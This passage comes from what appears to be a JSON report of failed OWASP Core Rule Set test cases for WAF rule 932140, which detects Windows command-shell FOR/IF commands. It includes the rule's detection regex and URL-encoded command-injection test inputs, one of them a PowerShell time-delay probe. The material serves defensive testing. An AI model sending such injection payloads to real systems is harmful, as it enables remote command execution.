      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=932120 - Remote Command Execution: Windows PowerShell Command Found", "phase=2 rule_id=941340 - IE XSS Filters - Attack Detected", "phase=2 rule_id=942120 - SQL Injection Attack: SQL Operator Detected", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942340 - Detects basic SQL authentication bypass attempts 3/3", "phase=2 rule_id=942370 - Detects classic SQL injection probings 2/3", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942511 - SQLi bypass attempt by ticks detected", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 10,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=%7Cfor+%2Ff+%22delims%3D%22+%25i+in+%28%27cmd+%2Fc+%22powershell.exe+-InputFormat+none+write+%27FJQPVY%27.length%22%27%29+do+if+%25i%3D%3D6+%28cmd+%2Fc+%22powershell.exe+-InputFormat+none+Start-Sleep+-s+2%22%29",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 11,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 11,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR++++++++++++++%25a+IN+%28set%29+DO+abc",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 12,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 12,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FD+++++++++++%25a+IN+%28dirs%29+DO+abc",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 13,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942460 - Meta-Character Anomaly Detection Alert - Repetitive Non-Word Characters", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 13,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FD+%2FD++++++++%25a+IN+%28dirs%29+DO+abc",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] item1   [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] item2"
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] (item1) [==|EQU|NEQ|LSS|LEQ|GTR|GEQ] (item2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/if.html"
        }, {
          "type" : "Comment",
          "text" : " http://ss64.com/nt/for.html"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/932140.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
          "text" : "   crs-toolchain regex update 932140"
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "REQUEST_COOKIES_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS_NAMES",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "ARGS",
          "key" : null
        }, {
          "type" : "CollectionVariable",
          "collection" : "XML",
          "key" : "/*"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "rx",
        "pattern" : "\\b(?:for(?:/[dflr].*)? %+[^ ]+ in\\(.*\\)[\\s\\x0b]?do|if(?:/i)?(?: not)?(?: (?:e(?:xist|rrorlevel)|defined|cmdextversion)\\b|[ \\(].*(?:\\b(?:g(?:eq|tr)|equ|neq|l(?:eq|ss))\\b|==)))"
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 932140
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 2
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "cmdLine"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "Remote Command Execution: Windows FOR/IF Command Found"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-shell"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-windows"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-rce"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/1"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-RCE"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/88"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.rce_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl1=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "932140",
    "test_id" : 14,
    "test_path" : "REQUEST-932-APPLICATION-ATTACK-RCE/932140.yaml",
    "description" : "imported test",
    "cause" : "failed expect_id check: 932140 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920272 - Invalid character in request (outside of printable chars below ascii 127)", "phase=2 rule_id=920273 - Invalid character in request (outside of very strict set)", "phase=2 rule_id=942150 - SQL Injection Attack: SQL function name detected", "phase=2 rule_id=942410 - SQL Injection Attack", "phase=2 rule_id=942430 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (12)", "phase=2 rule_id=942520 - Detects basic SQL authentication bypass attempts 4.0/4", "phase=2 rule_id=942431 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (6)", "phase=2 rule_id=942432 - Restricted SQL Character Anomaly Detection (args): # of special characters exceeded (2)" ]
    },
    "test" : {
      "test_id" : 14,
      "desc" : "imported test",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5",
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent"
          },
          "method" : "GET",
          "port" : 80,
          "uri" : "/get?foo=FOR+%2FF+%22options%22+%25a+IN+%28text%29+DO+abc",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 932140 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 932140,
      "phase" : 2,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : " [ Windows FOR, IF commands ]"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This rule detects Windows command shell FOR and IF commands."
        }, {
          "type" : "Comment",
          "text" : " If you are not running Windows, it is safe to disable this rule."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Examples:"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   FOR              %a IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /D           %a IN (dirs) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /F \"options\" %a IN (text|\"text\") DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /L           %a IN (start,step,end) DO"
        }, {
          "type" : "Comment",
          "text" : "   FOR /R C:\\dir    %A IN (set) DO"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : "   IF [/I] [NOT] EXIST filename | DEFINED define | ERRORLEVEL n | CMDEXTVERSION n"
        }, {
